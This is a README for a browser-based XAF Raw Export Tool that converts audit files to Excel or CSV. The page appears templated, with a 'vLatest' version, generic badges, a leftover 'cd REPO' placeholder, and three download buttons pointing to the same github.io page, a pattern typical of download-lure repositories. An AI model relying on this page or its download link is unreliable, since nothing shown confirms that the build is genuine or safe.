# XAF Raw Export Tool vLatest - data export tool 2026

> **Browser-based XAF auditfile export for financial review.** Open XAF files in the browser, convert them to Excel or CSV, and keep the workflow on a current client-side build with no server step.

[![Platform](https://img.shields.io/badge/Platform-browser-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-vLatest-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/seanqhlscott1070/xaf-raw-export-tool?style=flat-square)](https://github.com/seanqhlscott1070/xaf-raw-export-tool)

---

<p align="center">
  <a href="https://seanqhlscott1070.github.io/xaf-raw-export-tool/">
    <img src="https://img.shields.io/badge/Download-XAF%20Raw%20Export%20Tool%20Latest-brightgreen?style=for-the-badge" alt="Download XAF Raw Export Tool">
  </a>
</p>

> **[Download Latest Build - XAF Raw Export Tool vLatest](https://seanqhlscott1070.github.io/xaf-raw-export-tool/)**

---

[Download Latest Build](https://seanqhlscott1070.github.io/xaf-raw-export-tool/)

---

## Overview

XAF Raw Export Tool is a browser-only utility for handling XAF audit files. It lets users review, filter, and export audit data without a backend service or a separate desktop install.

The tool is intended for financial audit workflows that need raw XAF content converted into more practical Excel or CSV output. It supports several XAF versions, including split Exact Globe Next file sets, and provides checks that help users assess balances and reconciliation status during export.

---

## What it does

- Imports XAF audit files directly in the browser
- Exports data to Excel and CSV formats
- Runs fully client-side with no server required
- Supports XAF 3.1, 3.2, and 4.0
- Handles split Exact Globe Next file sets
- Includes period filtering for focused exports
- Supports account-level export workflows
- Uses Web Worker streaming for large-file processing
- Includes column balance and reconciliation checks

---

## Getting Started

1. Clone or download the repository.
2. Open the HTML application in a modern browser.
3. Load an XAF file and start exporting from the interface.

Example:

git clone https://github.com/seanqhlscott1070/xaf-raw-export-tool.git
cd REPO

Then open the main HTML file in your browser. No server setup is required for normal use.

---

## How to use it

1. Open the tool in a supported browser.
2. Import an XAF audit file.
3. Choose the export format, such as Excel or CSV.
4. Apply period filters if you need a narrower output.
5. Use account-level export when you need data grouped by account.
6. Review balance and reconciliation results before saving the export.

Typical workflow:

- Load a single XAF file or a split Exact Globe Next set
- Confirm the detected XAF version
- Select the desired time period
- Export the cleaned result to your preferred format

---

## Configuration notes

This project is primarily driven through the browser interface, so most settings are handled at runtime rather than through a large config file.

If you customize the app, keep browser support and client-side file handling in mind. Any saved preferences or export choices should be stored in the application layer or browser storage, depending on how you extend the tool.

---

## Requirements

- A modern browser with HTML5 and Web Worker support
- Sufficient local memory and storage for the files you import
- XAF audit files in supported formats: 3.1, 3.2, or 4.0
- Browser access to open local files and process large exports client-side

---

## FAQ

**Does it need a server?**  
No. The tool is built to run in the browser without a backend.

**What file types can it export?**  
It can export XAF data to Excel and CSV.

**Can it handle large files?**  
Yes. Large-file processing is supported through Web Worker streaming.

**Does it support split exports from Exact Globe Next?**  
Yes. Split file handling is included.

**Where do I report problems or request updates?**  
Use the repository’s issue tracking or maintenance workflow for support and changes.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
